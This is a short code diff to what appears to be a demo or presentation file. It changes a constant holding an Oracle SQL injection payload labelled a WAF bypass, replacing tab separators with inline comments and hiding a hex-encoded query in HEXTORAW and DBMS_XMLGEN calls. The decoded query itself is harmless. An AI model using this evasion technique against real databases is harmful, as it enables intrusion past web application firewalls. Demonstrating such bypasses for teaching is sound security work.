@@ -9,7 +9,7 @@
  *   select 'RES' from dual
  */
 export const ATTACK2_WAF_BYPASS_XML_HEX =
-  "x'\tOR\tREGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') --";
+  "x'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') --";
 
 /** Human-readable decode of the HEXTORAW blob (for presenter notes). */
 export const ATTACK2_WAF_BYPASS_HEX_DECODE = "select 'RES' from dual";
